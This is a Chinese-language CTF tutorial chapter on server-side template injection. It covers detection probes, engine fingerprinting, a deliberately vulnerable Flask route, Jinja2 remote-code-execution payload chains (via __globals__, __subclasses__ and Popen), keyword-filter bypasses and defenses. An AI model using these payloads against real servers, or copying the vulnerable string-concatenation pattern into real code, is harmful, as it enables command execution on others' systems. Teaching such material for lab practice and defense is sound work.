# 第 13 章 SSTI 服务端模板注入

## 本章目标

读完这一章，你将能够：

- 理解模板引擎的作用和 SSTI 的本质
- 识别常见模板引擎（Jinja2/Twig/Smarty 等）
- 用探测 payload 判断模板引擎类型
- 掌握 Jinja2 SSTI 从探测到 RCE 的完整利用链
- 理解 SSTI 与其他注入漏洞的共同本质
- 知道 SSTI 的防御方法

> SSTI（Server-Side Template Injection，服务端模板注入）是 CTF 里的"明星考点"——它往往能直接导致 RCE，而且利用链设计得非常巧妙。它本质上是"数据与模板代码混淆"的又一个案例。

---

## 13.1 概念：模板引擎在做什么

### 13.1.1 一个生活类比：填空式作文模板

想象你有一份"填空式"作文模板：

```
亲爱的【姓名】：
  祝贺你成为【班级】的一员！
```

老师（服务器）把每个学生的名字和班级填进去，生成 personalized 的作文。**模板是固定的框架，名字和班级是要填的数据。**

**SSTI 的问题**：如果学生能控制"模板本身"（而不只是填空的内容），他就能在模板里写"指令"——比如"把全班名单念出来"——而老师会照着执行。

**核心一句话**：**用户输入被当作模板代码解析执行了，而不只是当作填入的数据。**

### 13.1.2 正常的模板使用

以 Python 的 Jinja2 为例：

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    # 正确：把 name 作为数据传给模板
    return render_template_string('Hello {{ name }}', name=name)
```

访问 `?name=Alice`，输出 `Hello Alice`。这里 `{{ name }}` 是模板语法（变量占位符），`name` 的值作为**数据**填入——安全。

### 13.1.3 有漏洞的写法

```python
@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    # 危险：把用户输入直接拼进模板字符串
    return render_template_string('Hello ' + name)
```

这里用户输入 `name` 成了**模板代码的一部分**。如果你输入 `{{ 7*7 }}`，模板引擎会把它当表达式计算，输出 `Hello 49`——**代码被执行了**！

这就是 SSTI：**用户输入被拼进模板，模板引擎解析并执行了它。**

---

## 13.2 探测：判断是否存在 SSTI

### 13.2.1 经典探测 payload

在可疑输入点尝试这些数学表达式：

```
{{ 7*7 }}       → 如果输出 49，说明模板执行了表达式（Jinja2/Twig）
${7*7}          → Java/部分模板
<%= 7*7 %>      → ERB (Ruby)
#{7*7}          → 部分模板
{{7*'7'}}       → Jinja2 输出 7777777，Twig 输出 49（可区分引擎）
```

**判断逻辑**：如果输入 `{{7*7}}` 后页面显示 `49`（而不是原样的 `{{7*7}}`），说明模板引擎解析了你的输入——存在 SSTI。

### 13.2.2 识别模板引擎

不同引擎语法不同，用特征 payload 区分：

| 输入 | Jinja2 | Twig | Smarty |
|------|--------|------|--------|
| `{{7*7}}` | 49 | 49 | 原样/报错 |
| `{{7*'7'}}` | 7777777 | 49 | — |
| `{7*7}` | — | — | 49 |

确定引擎后，才能用对应语法构造利用链。CTF 里 **Jinja2（Python/Flask）最常见**。

---

## 13.3 Jinja2 SSTI：从探测到 RCE

这是 CTF 最常考的场景。利用链设计巧妙，我们一步步拆。

### 13.3.1 思路：找到"能执行代码的对象"

Jinja2 里可以访问对象的属性和方法。目标是找到一个"逃生出口"——从模板沙箱里跳出，拿到能执行系统命令的 Python 对象。

**常用手法**：通过某个对象找到它的 `__class__`，再找到 `__base__`（父类），一路找到 `object` 基类，然后通过 `__subclasses__()` 列出所有子类，从中找到能执行命令的类（如 `subprocess.Popen`、`os._wrap_close` 里的 `popen`）。

### 13.3.2 常用 payload

**基础探测**：

```
{{ 7*7 }}                          → 49，确认 SSTI
{{ config }}                       → Flask 的配置对象，可能泄露 SECRET_KEY
{{ config.items() }}               → 列出所有配置项
```

**读取文件 / 命令执行**（经典链）：

```
# 通过 os 模块执行命令（如果 config 可用）
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}

# 通过 __subclasses__ 找 subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__() }}
→ 列出所有子类，找到 <class 'subprocess.Popen'> 的索引，比如 414
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /flag', shell=True, stdout=-1).communicate()[0] }}
```

**解读这条链**：
- `''` 是个字符串对象
- `.__class__` 得到 `str` 类
- `.__mro__[1]` 得到 `object` 基类（MRO 是方法解析顺序）
- `.__subclasses__()` 列出 object 的所有子类
- 从中找到 `subprocess.Popen`，调用它执行命令

### 13.3.3 简化的常用 payload

CTF 里常用更简洁的链：

```
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
{{ url_for.__globals__['os'].popen('cat /flag').read() }}
```

`cycler`、`lipsum`、`url_for` 是 Jinja2/Flask 环境里默认存在的对象，通过它们的 `__globals__` 能拿到 `os` 模块，进而 `popen` 执行命令。

**小白问：为什么 `__globals__` 这么关键？**
> 因为 Python 函数对象有个 `__globals__` 属性，指向它所在的全局命名空间（一个字典）。函数里 import 的模块（如 os）就在这个字典里。通过它，你能从"一个普通函数"跳到"os 模块"，从而执行系统命令。这是 SSTI 和 Python 沙箱逃逸的核心技巧。

### 13.3.4 绕过过滤

出题人会过滤 `__class__`、`os`、`popen` 等关键词。绕过方法：

```
# 用属性访问绕过点号过滤
{{ ''['__class__'] }}  或  {{ ''|attr('__class__') }}

# 用字符串拼接绕过关键词过滤
{{ lipsum.__globals__['o'+'s'].popen('cat /flag').read() }}

# 用请求对象传参
?x=__class__&y=...  {{ ''|attr(request.args.x) }}
```

核心还是"替换与拼接"——和前面漏洞的绕过思路一致。

---

## 13.4 其他模板引擎（了解）

| 引擎 | 语言 | 探测 | 利用思路 |
|------|------|------|---------|
| Twig | PHP | `{{7*7}}` | 利用 `_self`、filter 等找 RCE |
| Smarty | PHP | `{7*7}` | `{if}` 标签里插 PHP 代码 |
| Thymeleaf | Java | `${7*7}` | 表达式注入 |
| Freemarker | Java | `${7*7}` | 内置函数可执行 |

思路相同：**先探测确认引擎 → 查该引擎的利用链 → 拿 flag**。具体到每个引擎的 payload 可查 CTF 速查表（第 25 章推荐资源）。

---

## 13.5 实战流程

```
① 观察：找一个"输入什么就显示什么"的地方（用户名、搜索、留言）
② 假设：可能是模板渲染，试 {{7*7}}
③ 验证：输出 49 → 确认 SSTI；用 {{7*'7'}} 区分引擎
④ 深入：
   - {{ config }} 找密钥/flag
   - 构造利用链执行 cat /flag
   - 遇过滤用 attr/拼接绕过
⑤ 归纳：记录引擎类型和有效 payload
```

---

## 13.6 SSTI 的防御

| 措施 | 说明 |
|------|------|
| **永远不把用户输入拼进模板** | 根本解法：用模板的变量传值，如 `render(..., name=user_input)` |
| 固定模板 | 模板由开发者控制，用户只提供数据 |
| 沙箱环境 | 限制模板能访问的对象/方法 |
| 输入校验 | 辅助，不能替代正确用法 |

**根本原则**：和所有注入一样——**数据与代码分离**。用户输入是数据，模板是代码，绝不混在一起。

---

## 13.7 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| SSTI 本质 | 用户输入被当模板代码执行 |
| 探测 | `{{7*7}}`→49；`{{7*'7'}}` 区分 Jinja2/Twig |
| Jinja2 利用 | `lipsum.__globals__['os'].popen('cat /flag').read()` |
| 核心技巧 | `__globals__` 跳到 os 模块；`__subclasses__()` 找 Popen |
| 绕过 | `attr()`、字符串拼接、request 传参 |
| 防御 | 用户输入只作数据传给模板，不拼进模板代码 |

---

## 本章练习

1. 在本地搭一个 Flask + Jinja2 应用，写一个有 SSTI 的路由，用 `{{7*7}}` 验证。
2. 把它改成安全写法（用变量传值），再试 `{{7*7}}`，观察输出变化。
3. 在 CTF 靶场做一道 Jinja2 SSTI 题，用 `lipsum.__globals__` 链读 flag。
4. 用 `{{''.__class__.__mro__[1].__subclasses__()}}` 列出子类，找到 subprocess.Popen 的索引。
5. 思考：SSTI 和 SQL 注入、命令执行的共同本质是什么？（都用一句话总结）

---

**下一章预告**：第 14 章讲 XXE（XML 外部实体注入）——当服务器解析 XML 时允许"外部实体"，攻击者就能读本地文件、探测内网。这也是"数据里藏指令"的经典案例。
